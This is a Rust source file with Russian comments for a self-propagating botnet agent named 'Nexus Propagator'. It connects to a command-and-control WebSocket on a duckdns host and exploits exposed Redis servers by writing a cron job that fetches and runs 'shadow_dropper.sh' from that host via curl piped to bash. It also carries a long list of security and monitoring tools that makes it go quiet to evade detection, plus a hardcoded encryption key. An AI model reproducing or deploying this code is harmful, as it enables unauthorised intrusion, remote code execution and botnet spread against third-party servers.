use tokio_tungstenite::{connect_async, tungstenite::protocol::Message};
use url::Url;
use aes_gcm::{Aes256Gcm, Key, Nonce};
use aes_gcm::aead::{Aead, KeyInit, OsRng};
use rand_core::RngCore;
use tokio::time::{sleep, Duration};
use futures_util::sink::SinkExt; // Добавляем SinkExt
use futures_util::stream::StreamExt; // Добавляем StreamExt
use redis::{Client, cmd}; // Удаляем AsyncCommands и RedisResult
use sysinfo::{System, SystemExt, ProcessExt}; // Добавляем импорты для sysinfo
use std::sync::atomic::{AtomicBool, Ordering}; // Для Lurk Mode
use std::sync::Arc; // Для Arc
use serde::{Deserialize, Serialize}; // Добавляем для Command и Report
use uuid::Uuid; // Добавляем для генерации client_id

// Временный ключ для демонстрации. Должен быть таким же, как в C2.
const KEY: &[u8; 32] = b"a_very_secret_key_for_aes256gcm!";

// Список процессов, которые указывают на мониторинг
const LURK_MODE_PROCESSES: &[&str] = &[
    "tcpdump", "wireshark", "htop", "top", "strace", "lsof", "netstat", "ss", "iftop", "nmap",
    "snort", "zeek", "auditd", "sysdig", "falco", "osquery", "procmon", "dtrace", "perf",
    "valgrind", "gdb", "radare2", "ollydbg", "x64dbg", "ida", "ghidra", "burpsuite", "zap",
    "metasploit", "kali", "parrot", "blackarch", "securityonion", "pfSense", "openvpn",
    "wireguard", "iptables", "firewalld", "ufw", "selinux", "apparmor", "clamav", "rkhunter",
    "chkrootkit", "lynis", "openvas", "nessus", "acunetix", "qualys", "nexpose", "greenbone",
    "wazuh", "splunk", "elk", "graylog", "logstash", "kibana", "prometheus", "grafana",
    "zabbix", "nagios", "icinga", "monit", "collectd", "telegraf", "influxdb", "datadog",
    "newrelic", "dynatrace", "appdynamics", "elastic", "sumologic", "loggly", "papertrail",
    "sentry", "bugsnag", "rollbar", "honeycomb", "lightstep", "jaeger", "zipkin", "opentracing",
    "opencensus", "opentelemetry", "aws", "azure", "gcp", "cloudwatch", "stackdriver",
    "azuremonitor", "snyk", "dependabot", "renovate", "whitesource", "blackduck", "veracode",
    "checkmarx", "sonarqube", "fortify", "coverity", "codeql", "bandit", "safety", "pylint",
    "flake8", "mypy", "eslint", "prettier", "stylelint", "hadolint", "terraform", "ansible",
    "puppet", "chef", "saltstack", "kubernetes", "docker", "containerd", "runc", "crio",
    "podman", "buildah", "skopeo", "helm", "kubectl", "minikube", "kind", "k3s", "k0s",
    "rancher", "openshift", "pfsense", "opnsense", "snort", "suricata", "bro", "zeek", "fail2ban",
    "denyhosts", "portsentry", "honeyd", "cowrie", "t-pot", "elasticpot", "glastopf", "kippo",
    "dionaea", "conpot", "mnemosyne", "amun", "artemis", "hercules", "pcap", "wireshark",
    "tshark", "dumpcap", "ettercap", "dsniff", "tcpflow", "tcpreplay", "ngrep", "darktrace",
    "vectra", "cybereason", "crowdstrike", "carbonblack", "sentinelone", "sophos", "mcafee",
    "symantec", "kaspersky", "eset", "bitdefender", "avast", "avg", "windowsdefender",
    "fireeye", "paloalto", "fortinet", "checkpoint", "cisco", "juniper", "f5", "akamai",
    "cloudflare", "imperva", "radware", "arbor", "netscout", "gigamon", "extrahop", "darktrace",
    "vectra", "cybereason", "crowdstrike", "carbonblack", "sentinelone", "sophos", "mcafee",
    "symantec", "kaspersky", "eset", "bitdefender", "avast", "avg", "windowsdefender",
    "fireeye", "paloalto", "fortinet", "checkpoint", "cisco", "juniper", "f5", "akamai",
    "cloudflare", "imperva", "radware", "arbor", "netscout", "gigamon", "extrahop",
];

// Команды, которые C2 может отправлять Nexus-пропагаторам
#[derive(Debug, Serialize, Deserialize)]
pub enum Command {
    Hello { c2_id: String },
    ExploitRedis { target_ip: String },
    // Другие команды могут быть добавлены здесь
}

// Отчеты, которые Nexus-пропагаторы отправляют обратно в C2
#[derive(Debug, Serialize, Deserialize)]
pub enum Report {
    Hello { client_id: String },
    ExploitResult { target_ip: String, success: bool, message: String },
    // Другие типы отчетов
}

// Функции шифрования/дешифрования, скопированные из C2
fn encrypt_message(plaintext: &[u8]) -> Result<Vec<u8>, String> {
    let key = Key::<Aes256Gcm>::from_slice(KEY);
    let cipher = Aes256Gcm::new(key);
    let mut nonce_bytes = [0u8; 12];
    OsRng.fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    cipher.encrypt(nonce, plaintext)
        .map(|mut ciphertext| {
            let mut result = Vec::with_capacity(nonce_bytes.len() + ciphertext.len());
            result.extend_from_slice(&nonce_bytes);
            result.append(&mut ciphertext);
            result
        })
        .map_err(|e| format!("Encryption error: {:?}", e))
}

fn decrypt_message(ciphertext_with_nonce: &[u8]) -> Result<Vec<u8>, String> {
    if ciphertext_with_nonce.len() < 12 {
        return Err("Ciphertext too short to contain nonce".to_string());
    }
    let nonce = Nonce::from_slice(&ciphertext_with_nonce[..12]);
    let ciphertext = &ciphertext_with_nonce[12..];

    let key = Key::<Aes256Gcm>::from_slice(KEY);
    let cipher = Aes256Gcm::new(key);

    cipher.decrypt(nonce, ciphertext)
        .map_err(|e| format!("Decryption error: {:?}", e))
}

// Функция для выполнения Cron Hijacking через Redis
async fn execute_cron_exploit(target_ip: &str) -> Result<(), Box<dyn std::error::Error>> {
    println!("Attempting Cron Hijack on Redis at {}", target_ip);

    let redis_url = format!("redis://{}:6379/", target_ip);
    let client = Client::open(redis_url)?;
    let mut con = client.get_multiplexed_async_connection().await?; // Используем get_multiplexed_async_connection

    // Шаг 1: Смена рабочей директории
    let cron_dir_primary = "/var/spool/cron/crontabs/";
    let cron_dir_fallback = "/etc/cron.d/";
    let mut dir_set_successfully = false;

    println!("Trying to set Redis dir to {}", cron_dir_primary);
    match cmd("CONFIG").arg("SET").arg("dir").arg(cron_dir_primary).query_async::<String>(&mut con).await {
        Ok(_) => {
            println!("Successfully set Redis dir to {}", cron_dir_primary);
            dir_set_successfully = true;
        },
        Err(e) => {
            eprintln!("Failed to set Redis dir to {}: {}. Trying fallback...", cron_dir_primary, e);
            match cmd("CONFIG").arg("SET").arg("dir").arg(cron_dir_fallback).query_async::<String>(&mut con).await {
                Ok(_) => {
                    println!("Successfully set Redis dir to {}", cron_dir_fallback);
                    dir_set_successfully = true;
                },
                Err(e) => {
                    eprintln!("Failed to set Redis dir to {}: {}", cron_dir_fallback, e);
                }
            }
        }
    }

    if !dir_set_successfully {
        return Err("Failed to set Redis working directory to any cron path.".into());
    }

    // Шаг 2: Подмена базы данных
    println!("Setting Redis dbfilename to 'root'");
    cmd("CONFIG").arg("SET").arg("dbfilename").arg("root").query_async::<String>(&mut con).await?;
    println!("Successfully set Redis dbfilename to 'root'");

    // Шаг 3: Payload Injection
    // C2_IP_PLACEHOLDER будет заменен на реальный IP C2 позже
    let payload = format!("\n\n\n\n* * * * * curl -sL http://angel0chek.duckdns.org/shadow_dropper.sh | bash\n\n\n\n");
    println!("Injecting cron payload...");
    cmd("SET").arg("cron_payload").arg(payload).query_async::<String>(&mut con).await?;
    println!("Successfully injected cron payload.");

    // Шаг 4: Финализация - выполнение SAVE для немедленной записи на диск
    println!("Executing Redis SAVE command...");
    cmd("SAVE").query_async::<String>(&mut con).await?;
    println!("Redis SAVE command executed successfully. Cron Hijack attempt complete.");

    Ok(())
}

// Функция для мониторинга процессов и активации Lurk Mode
async fn monitor_processes(lurk_mode_active: Arc<AtomicBool>) {
    let mut sys = System::new_all();
    loop {
        sys.refresh_processes();
        let mut found_monitoring_tool = false;
        for (_, process) in sys.processes() {
            let process_name = process.name().to_lowercase();
            if LURK_MODE_PROCESSES.iter().any(|&tool| process_name.contains(tool)) {
                println!("Detected monitoring tool: {} (PID: {})", process.name(), process.pid());
                found_monitoring_tool = true;
                break;
            }
        }

        if found_monitoring_tool {
            if !lurk_mode_active.load(Ordering::Relaxed) {
                println!("Lurk Mode activated!");
                lurk_mode_active.store(true, Ordering::Relaxed);
            }
        } else {
            if lurk_mode_active.load(Ordering::Relaxed) {
                println!("Lurk Mode deactivated!");
                lurk_mode_active.store(false, Ordering::Relaxed);
            }
        }

        sleep(Duration::from_secs(5)).await; // Проверяем каждые 5 секунд
    }
}

#[tokio::main]
async fn main() {
    println!("Nexus Propagator starting...");

    let lurk_mode_active = Arc::new(AtomicBool::new(false));

    // Запускаем задачу мониторинга процессов
    tokio::spawn(monitor_processes(Arc::clone(&lurk_mode_active)));

    // Подключение к WebSocket C2
    let connect_addr = Url::parse("ws://angel0chek.duckdns.org:3000/ws").expect("Can't parse URL");
    let (mut ws_stream, _) = connect_async(connect_addr)
        .await
        .expect("Failed to connect to C2 WebSocket");

    println!("Connected to C2 WebSocket at ws://127.0.0.1:3000/ws");

    // Отправляем зашифрованное приветственное сообщение
    let client_id = Uuid::new_v4().to_string(); // Генерируем уникальный ID для бота
    let initial_hello_report = Report::Hello { client_id: client_id.clone() };
    let serialized_report = serde_json::to_vec(&initial_hello_report).expect("Failed to serialize report");
    let encrypted_message = encrypt_message(&serialized_report)
        .expect("Failed to encrypt message");
    ws_stream.send(Message::Binary(encrypted_message)).await.expect("Failed to send message");


    // Основной цикл обработки сообщений
    loop {
        tokio::select! {
            // Обработка входящих сообщений от C2
            msg = ws_stream.next() => {
                if lurk_mode_active.load(Ordering::Relaxed) {
                    println!("Lurk Mode active, ignoring incoming C2 message.");
                    continue;
                }
                match msg {
                    Some(Ok(Message::Binary(bytes))) => {
                        match decrypt_message(&bytes) {
                            Ok(decrypted) => {
                                // Попытка десериализовать в Command
                                match serde_json::from_slice::<Command>(&decrypted) {
                                    Ok(command) => {
                                        println!("Received command from C2: {:?}", command);
                                        match command {
                                            Command::Hello { c2_id } => {
                                                println!("Received Hello from C2: {}", c2_id);
                                                // Отправляем свой Hello обратно, если еще не отправляли
                                                let hello_report = Report::Hello { client_id: client_id.clone() };
                                                let serialized_report = serde_json::to_vec(&hello_report).expect("Failed to serialize report");
                                                let encrypted_report = encrypt_message(&serialized_report).expect("Failed to encrypt report");
                                                ws_stream.send(Message::Binary(encrypted_report)).await.expect("Failed to send hello report");
                                            },
                                            Command::ExploitRedis { target_ip } => {
                                                println!("Received ExploitRedis command for {}", target_ip);
                                                let exploit_result = execute_cron_exploit(&target_ip).await;
                                                let report = match exploit_result {
                                                    Ok(_) => Report::ExploitResult {
                                                        target_ip: target_ip.clone(),
                                                        success: true,
                                                        message: format!("Successfully exploited Redis at {}", target_ip),
                                                    },
                                                    Err(e) => Report::ExploitResult {
                                                        target_ip: target_ip.clone(),
                                                        success: false,
                                                        message: format!("Failed to exploit Redis at {}: {}", target_ip, e),
                                                    },
                                                };
                                                let serialized_report = serde_json::to_vec(&report).expect("Failed to serialize report");
                                                let encrypted_report = encrypt_message(&serialized_report).expect("Failed to encrypt report");
                                                ws_stream.send(Message::Binary(encrypted_report)).await.expect("Failed to send exploit report");
                                            },
                                        }
                                    },
                                    Err(e) => {
                                        eprintln!("Failed to deserialize command: {}. Decrypted text: {:?}", e, String::from_utf8_lossy(&decrypted));
                                    }
                                }
                            },
                            Err(e) => eprintln!("Decryption failed: {}", e),
                        }
                    },
                    Some(Ok(Message::Text(text))) => {
                        println!("Received unencrypted text message from C2: {}", text);
                    },
                    Some(Ok(Message::Ping(pong))) => {
                        ws_stream.send(Message::Pong(pong)).await.expect("Failed to send pong");
                    },
                    Some(Ok(Message::Close(c))) => {
                        println!("C2 WebSocket connection closed with: {:?}", c);
                        break;
                    },
                    Some(Err(e)) => {
                        eprintln!("WebSocket error: {}", e);
                        break;
                    },
                    _ => {
                        eprintln!("Received other WebSocket message type from C2.");
                    }
                }
            }
            // Заглушка для локального сканирования /24
            _ = sleep(Duration::from_secs(10)) => {
                if lurk_mode_active.load(Ordering::Relaxed) {
                    println!("Lurk Mode active, skipping localized /24 scan.");
                    continue;
                }
                println!("Performing localized /24 scan (placeholder)...");
            }
        }
    }

    println!("Nexus Propagator shutting down.");
}